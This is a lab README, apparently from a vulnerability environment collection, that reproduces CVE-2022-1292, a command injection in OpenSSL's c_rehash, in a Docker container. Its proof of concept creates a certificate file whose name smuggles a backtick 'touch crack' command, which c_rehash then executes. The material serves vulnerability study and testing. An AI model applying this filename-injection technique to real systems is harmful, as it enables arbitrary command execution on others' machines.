# OpenSSL Command Inject（CVE-2022-1292）

[中文版本(Chinese version)](README.zh-cn.md)

`c_rehash` in OpenSSL has a Command Inject Bug which allowed `c_rehash` executes command with it permission。

vulnerable version：

+ 3.0.0 <= OpenSSL <= 3.0.2
+ 1.1.1 <= OpenSSL <= 1.1.1n
+ 1.0.2 <= OpenSSL <= 1.0.2zd

test environment used `1.1.1m` version which already exits in VulHub

Reference links：

+ <https://cve.report/CVE-2022-1292>
+ <https://xz.aliyun.com/t/11703>

## Vulnerability environment

Execute following command to start a server:

```
docker-compose up -d
```

## Reproduce vulnerability

use `touch xxxx` to prove command executed success

after the vulnerability environment is started, enter the vulnerability environment container through `bash`：

```
docker-compose exec ssl bash 
```

run

```
mkdir test && cd test
echo "-----BEGIN CERTIFICATE-----" > "1.crt\`touch crack\`"
ls 
```

![1.png](1.png)

and then

```
c_rehash .
```

found `crack` already created, command executed success.

![2.png](2.png)
